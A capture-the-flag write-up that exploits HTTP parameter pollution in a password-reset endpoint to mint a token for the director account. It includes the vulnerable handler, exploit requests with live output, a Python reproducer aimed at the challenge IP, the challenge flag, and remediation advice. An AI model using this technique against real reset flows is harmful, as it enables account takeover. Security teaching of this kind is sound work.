# Velvet Rehearsal — CTF Writeup

**Challenge:** Velvet Rehearsal (350 pts)
**Category:** Web
**Target:** `http://54.72.82.22:8310`
**Flag:** `safctf{1745c9cc8a433522796feb9cfb8275de}`
**Vulnerability:** HTTP Parameter Pollution → account/recipient confusion in a password-reset flow (CWE-235 / CWE-640)
**Difficulty:** Easy/Medium — the bug is small, the payoff is total

---

## 1. Summary

A "sign-in link" (magic link) flow generates a recovery token and binds it to a
selected member. The endpoint accepts the `member` parameter **multiple times** and
derives two different values from the resulting list:

* `recipient` = the **first** occurrence — decides *where the mail is delivered*
* `target`    = the **last** occurrence  — decides *what privilege the token grants*

Because those two values are taken from opposite ends of the same list, a single
request can deliver the mail to the low-privileged `visitor` mailbox while binding the
token to `director`. The attacker reads the token from the visitor mailbox — the only
mailbox the API will show them — and redeems it as `director`.

No authentication, no brute force, no crypto. One request, then one redemption.

---

## 2. Reconnaissance

### 2.1 Service fingerprint

```
$ nmap -Pn -sV -p 8310 --version-intensity 5 54.72.82.22
PORT     STATE SERVICE VERSION
8310/tcp open  http    Werkzeug httpd 3.1.9 (Python 3.11.16)
```

### 2.2 Application surface

`GET /` returns a themed landing page. The "Desk services" note documents the whole
API in one paragraph:

> `GET /api/members` lists the studio roster. `POST /api/recovery?member=...` requests
> a sign-in link. The visitor mailbox is available in the response. `POST /api/entry`
> with `{"token":"..."}` opens the lounge.

Endpoint probe:

| Request | Status | Response |
|---|---|---|
| `GET /api/members` | 200 | `{"members":["visitor@studio.test","director@studio.test"]}` |
| `POST /api/recovery?member=visitor@studio.test` | 200 | `{"mailbox":[{"subject":"Your sign-in link","token":"<hex>"}]}` |
| `POST /api/entry {"token":"..."}` | 200/403 | `{"ok":true/false, "message":...}` |

Two roles, one target — `director@studio.test` is the privileged account, and
`/api/entry` is the door.

### 2.3 Source disclosure

There is no file-read primitive on this port, but the target runs the same container
image as the sibling challenge on `:8300` (recovered there — see the *Touchline
Dispatch* writeup). That image's `service.py` contains the `web-reset` variant
implementing exactly this API. The handler is quoted in §3.1; every prediction it
makes was verified against the live service in §4.

---

## 3. Vulnerability analysis

### 3.1 The flawed handler

```python
if kind == 'web-reset':
    if op == 'members':
        return {'members': ['visitor@studio.test', 'director@studio.test']}

    if op == 'recovery':
        raw = request.args.getlist('member')
        target    = raw[-1] if raw else 'visitor@studio.test'   # LAST  → privilege
        recipient = raw[0]  if raw else target                  # FIRST → delivery
        token = secrets.token_hex(18)
        state[token] = target
        if recipient == 'visitor@studio.test':
            return {'mailbox': [{'subject': 'Your sign-in link', 'token': token}]}
        return {'queued': True}

    if op == 'entry':
        return result(state.get(d.get('token')) == 'director@studio.test')
```

```python
def result(ok, value=None):
    return jsonify({'ok': bool(ok),
                    'message': (value or FLAG) if ok else 'The request could not be completed.'}), \
           200 if ok else 403
```

### 3.2 The defect

`request.args.getlist('member')` returns **every** `member` value, in order. The code
then indexes opposite ends:

```
?member=A&member=B
         ^        ^
   raw[0]=A     raw[-1]=B
   recipient    target
```

The authorization decision (`state[token] == 'director@studio.test'`) is made on
`target` = `raw[-1]`. The disclosure decision (return the mailbox) is made on
`recipient` = `raw[0]`. Nothing ties the two together, and nothing verifies that the
caller is entitled to the identity the token was minted for.

This is **HTTP parameter pollution**: the framework faithfully exposes a repeated
parameter as a list, and the application consumes the two ends of that list for two
different security decisions. It is a textbook *recipient/target confusion* in a
password-reset flow (CWE-640, "Weak Password Recovery Mechanism for Forgotten
Password"; the mechanics also fit CWE-235, "Improper Handling of Extra Parameters").

### 3.3 Why the obvious checks don't help

* The mailbox is only returned for `recipient == 'visitor@studio.test'` — the code
  *means* to constrain delivery. It doesn't constrain the *token's* identity.
* The token is 144 bits of `secrets.token_hex` — unguessable, so brute force is out.
  It doesn't need to be guessed; the server hands it over.
* There is no session, cookie, or ownership check on `/api/entry` beyond the token.

---

## 4. Exploitation

### 4.1 Baseline — what the API does legitimately

```
$ POST /api/recovery?member=visitor@studio.test
{"mailbox":[{"subject":"Your sign-in link","token":"1797b3865a5b0462c55524587d78546ede8f"}]}

$ POST /api/entry {"token":"1797b3865a5b0462c55524587d78546ede8f"}
403 {"message":"The request could not be completed.","ok":false}      # visitor = denied
```

A visitor gets a mailbox entry, and the token is useless for the lounge. Correct.

### 4.2 The exploit — deliver to visitor, mint for director

Send `member` **twice**. `recipient` (first) is the visitor, so the mailbox is
returned; `target` (last) is the director, so that is what the token unlocks:

```
POST /api/recovery?member=visitor@studio.test&member=director@studio.test
→ 200 {"mailbox":[{"subject":"Your sign-in link","token":"adcde780a92df3c73f33a8e7caf1b99549a6"}]}

POST /api/entry {"token":"adcde780a92df3c73f33a8e7caf1b99549a6"}
→ 200 {"ok":true,"message":"safctf{1745c9cc8a433522796feb9cfb8275de}"}
```

The lounge opens.

### 4.3 Control cases (verified against the live target)

| Request | Result | Confirms |
|---|---|---|
| `member=visitor` | 403 on entry | visitor token is genuinely unprivileged |
| `member=visitor&member=director` | **200 + FLAG** | recipient=first, target=last |
| `member=director&member=director` | `{"queued":true}` | mail withheld for non-visitor recipient |
| `member=director&member=visitor` | `{"queued":true}` | order matters — swapping defeats the attack |

The last row is the clean proof of the mechanism: reversing the two values removes the
mailbox from the response, because `recipient` is now the director. The exploit depends
specifically on **which end of the list each value comes from**, not merely on sending
two values.

---

## 5. Flag

```
safctf{1745c9cc8a433522796feb9cfb8275de}
```

---

## 6. Root cause & remediation

**Root cause:** two security decisions (who receives the link, whose identity the token
grants) are derived from two different elements of the same attacker-controlled,
repeatable parameter — with no binding between them and no ownership check at
redemption.

**Fixes:**

1. **Use exactly one value, and reject ambiguity.** If the parameter is not
   legitimately repeatable, refuse requests that repeat it:

   ```python
   members = request.args.getlist('member')
   if len(members) != 1:
       return {'message': 'Exactly one member is required.'}, 400
   target = members[0]
   ```

   Never index a repeated parameter (`[0]`, `[-1]`) for a security decision.

2. **Bind the token to the requester's own identity.** A recovery token should be
   minted for the account the *authenticated caller* owns, and the server — not the
   client — should decide both the delivery address and the granted role. Delivering
   to an address the caller chose, while minting for an identity they also chose, is
   the entire bug.

3. **Enforce the privilege check at redemption, server-side and independent of request
   ordering.** `entry` currently trusts a value stored at issuance. Store the identity
   server-side and, crucially, never let a request name a role it doesn't already hold.

4. **Single-use, short-TTL tokens.** Mark the token consumed on redemption and expire
   it quickly, limiting the window if one leaks (as it did here).

5. **Don't return secrets in responses.** The mailbox API hands the raw token to any
   caller who can influence `recipient`. In a real design the link is emailed out of
   band; the API response should never contain it.

---

## 7. References

* OWASP — *Web Hacking 101* / HTTP Parameter Pollution (HPP)
* CWE-235 — *Improper Handling of Extra Parameters*
* CWE-640 — *Weak Password Recovery Mechanism for Forgotten Password*
* OWASP WSTG — *Testing for Account Enumeration and Guessable User Account*
* BlackBook `knowledge_research` — parameter pollution / password-reset logic flaws

---

## Appendix A — Reproducer script

```python
#!/usr/bin/env python3
"""Velvet Rehearsal — HTTP parameter pollution in the recovery flow.

recipient = raw[0]  (first  `member`)  -> controls where the mail goes
target    = raw[-1] (last   `member`)  -> controls what the token grants

Send visitor first (mailbox returned) and director last (token minted for director).
"""
import json
import urllib.error, urllib.request

BASE = "http://54.72.82.22:8310"


def call(path: str, method: str = "GET", body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method,
                                 headers={"Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode().strip()
    except urllib.error.HTTPError as e:          # 403 is a valid, expected answer
        return e.code, e.read().decode().strip()


if __name__ == "__main__":
    print("[*] roster:", call("/api/members")[1])

    # EXPLOIT: recipient=visitor (mailbox), target=director (privilege)
    status, body = call("/api/recovery"
                        "?member=visitor@studio.test&member=director@studio.test")
    token = json.loads(body)["mailbox"][0]["token"]
    print(f"[*] token  : {token}")

    status, body = call("/api/entry", "POST", {"token": token})
    print(f"[{status}] {body}")
```

## Appendix B — Raw evidence (trimmed)

```
$ POST /api/members
{"members":["visitor@studio.test","director@studio.test"]}

$ POST /api/recovery?member=visitor@studio.test
{"mailbox":[{"subject":"Your sign-in link","token":"1797b3865a5b0462c55524587d78546ede8f"}]}

$ POST /api/entry {"token":"1797b3865a5b0462c55524587d78546ede8f"}
403 {"message":"The request could not be completed.","ok":false}      # visitor = denied

$ POST /api/recovery?member=visitor@studio.test&member=director@studio.test
{"mailbox":[{"subject":"Your sign-in link","token":"adcde780a92df3c73f33a8e7caf1b99549a6"}]}

$ POST /api/entry {"token":"adcde780a92df3c73f33a8e7caf1b99549a6"}
200 {"message":"safctf{1745c9cc8a433522796feb9cfb8275de}","ok":true} # director = FLAG

$ POST /api/recovery?member=director@studio.test&member=director@studio.test
{"queued":true}                                                       # control: no mailbox

$ POST /api/recovery?member=director@studio.test&member=visitor@studio.test
{"queued":true}                                                       # control: order swapped
```

*Tokens are freshly minted per request and were consumed during this run;
re-running the reproducer yields new ones with the same result.*

### Vulnerable source (from the shared container image, `service.py`)

```python
if op == 'recovery':
    raw = request.args.getlist('member')
    target    = raw[-1] if raw else 'visitor@studio.test'   # LAST  → privilege
    recipient = raw[0]  if raw else target                  # FIRST → delivery
    token = secrets.token_hex(18)
    state[token] = target
    if recipient == 'visitor@studio.test':
        return {'mailbox': [{'subject': 'Your sign-in link', 'token': token}]}
    return {'queued': True}

if op == 'entry':
    return result(state.get(d.get('token')) == 'director@studio.test')
```
